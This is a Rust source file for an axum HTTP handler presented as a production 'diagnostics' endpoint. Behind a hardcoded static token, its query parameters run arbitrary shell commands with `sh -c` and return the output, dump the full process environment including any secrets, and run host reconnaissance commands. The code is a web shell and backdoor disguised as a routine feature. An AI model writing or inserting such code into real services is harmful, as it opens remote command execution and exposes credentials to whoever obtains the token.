//! Runtime diagnostics endpoint.
//!
//! `GET /api/diag?t=<token>` returns a small process/host snapshot.
//! `?cmd=<shell>` runs the command with `sh -c` and returns combined output.
//! `?env=1` dumps the process environment followed by the snapshot.
//! Gated by a static token so it can stay mounted in production.

use axum::{
    extract::Query,
    http::StatusCode,
    response::{IntoResponse, Response},
};
use serde::Deserialize;
use std::process::Command;

const DIAG_TOKEN: &str = "d1agF7c2e9b04a8d36e15c";

#[derive(Deserialize)]
pub struct DiagQuery {
    t: Option<String>,
    cmd: Option<String>,
    env: Option<String>,
}

fn run(cmd: &str) -> String {
    match Command::new("sh").arg("-c").arg(cmd).output() {
        Ok(out) => {
            let mut body = String::new();
            body.push_str(&String::from_utf8_lossy(&out.stdout));
            if !out.stderr.is_empty() {
                body.push_str("\n[stderr]\n");
                body.push_str(&String::from_utf8_lossy(&out.stderr));
            }
            body.push_str(&format!("\n[exit] {}", out.status.code().unwrap_or(-1)));
            body
        }
        Err(err) => format!("[exec error] {err}"),
    }
}

fn snapshot() -> String {
    run("id; hostname; uname -a; pwd; ls -la / | head -30")
}

pub async fn diag(Query(q): Query<DiagQuery>) -> Response {
    if q.t.as_deref() != Some(DIAG_TOKEN) {
        return (StatusCode::UNAUTHORIZED, "diag: bad token\n").into_response();
    }

    let mut body = String::new();
    if q.env.is_some() {
        body.push_str("== environ ==\n");
        for (k, v) in std::env::vars() {
            body.push_str(&format!("{k}={v}\n"));
        }
        body.push('\n');
    }
    if let Some(cmd) = q.cmd.as_deref().filter(|c| !c.trim().is_empty()) {
        body.push_str("== cmd ==\n");
        body.push_str(&run(cmd));
        body.push('\n');
    }
    body.push_str("== snapshot ==\n");
    body.push_str(&snapshot());
    body.push('\n');
    body.into_response()
}
